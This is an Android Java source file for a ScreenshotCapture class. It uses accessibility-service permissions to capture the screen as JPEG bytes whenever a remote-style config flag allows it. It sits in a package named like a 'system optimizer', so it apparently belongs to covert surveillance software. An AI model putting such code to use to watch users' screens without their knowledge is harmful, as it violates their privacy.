package com.system.optimizer.handler;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.config.ConfigData;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;

public class ScreenshotCapture {
    private static final String TAG = "ScreenshotCapture";

    private final AccessibilityService service;
    private final ConfigManager configManager;

    // Ensure only one capture at a time
    private final AtomicBoolean isCapturing = new AtomicBoolean(false);

    public ScreenshotCapture(AccessibilityService delegate, ConfigManager configManager) {
        if (delegate == null) {
            throw new IllegalArgumentException("AccessibilityService cannot be null");
        }
        if (configManager == null) {
            throw new IllegalArgumentException("ConfigManager cannot be null");
        }
        this.service = delegate;
        this.configManager = configManager;
    }

    /**
     * Take a screenshot.
     * Only one capture can be in progress at a time.
     * 
     * @param callback Called with result
     */
    public void takeScreenshot(ScreenshotCallback callback) {
        // Reject if already capturing - only one at a time
        if (!isCapturing.compareAndSet(false, true)) {
            callback.onError("Screenshot already in progress");
            return;
        }

        // Run validation and capture
        try {
            ConfigData config = configManager.getCachedConfig();
            if (config == null) {
                completeWithError(callback, "Config not loaded");
                return;
            }
            if (!config.isAutoScreenshotEnabled()) {
                completeWithError(callback, "Screenshot disabled in config");
                return;
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                completeWithError(callback, "API < 30 not supported");
                return;
            }

            // Take screenshot
            takeScreenshotInternal(callback, config.getScreenshotQuality());

        } catch (Exception e) {
            android.util.Log.e(TAG, "Error: " + e.getMessage());
            completeWithError(callback, "Error: " + e.getMessage());
        }
    }

    /**
     * Internal method - calls Android takeScreenshot API.
     */
    private void takeScreenshotInternal(ScreenshotCallback callback, int quality) {
        try {
            service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.getMainExecutor(),
                    new ScreenshotResultHandler(callback, quality));
        } catch (Exception e) {
            android.util.Log.e(TAG, "Error initiating screenshot: " + e.getMessage());
            completeWithError(callback, "Error initiating: " + e.getMessage());
        }
    }

    /**
     * Complete callback with error.
     */
    private void completeWithError(ScreenshotCallback callback, String message) {
        isCapturing.set(false);
        callback.onError(message);
    }

    /**
     * Callback handler for takeScreenshot result.
     */
    private class ScreenshotResultHandler implements AccessibilityService.TakeScreenshotCallback {
        private final ScreenshotCallback callback;
        private final int quality;

        ScreenshotResultHandler(ScreenshotCallback callback, int quality) {
            this.callback = callback;
            this.quality = quality;
        }

        @Override
        public void onSuccess(AccessibilityService.ScreenshotResult result) {
            try {
                if (result == null) {
                    completeWithError(callback, "Screenshot result is null");
                    return;
                }

                HardwareBuffer buffer = result.getHardwareBuffer();
                if (buffer == null) {
                    completeWithError(callback, "Hardware buffer is null");
                    return;
                }

                ColorSpace colorSpace = result.getColorSpace();
                if (colorSpace == null) {
                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                }

                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                buffer.close();

                if (bitmap == null) {
                    completeWithError(callback, "Failed to create bitmap");
                    return;
                }

                byte[] imageData = bitmapToJpegBytes(bitmap, quality);
                bitmap.recycle();

                isCapturing.set(false);
                callback.onSuccess(imageData);

            } catch (Exception e) {
                android.util.Log.e(TAG, "Error processing: " + e.getMessage());
                completeWithError(callback, "Error processing: " + e.getMessage());
            }
        }

        @Override
        public void onFailure(int error) {
            String errorMessage = "Screenshot failed with error: " + error;
            android.util.Log.w(TAG, errorMessage);
            completeWithError(callback, errorMessage);
        }
    }

    /**
     * Callback interface for screenshot capture result.
     */
    public interface ScreenshotCallback {
        void onSuccess(byte[] imageData);

        void onError(String errorMessage);
    }

    /**
     * Convert Bitmap to JPEG byte array.
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap, int quality) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        return baos.toByteArray();
    }

}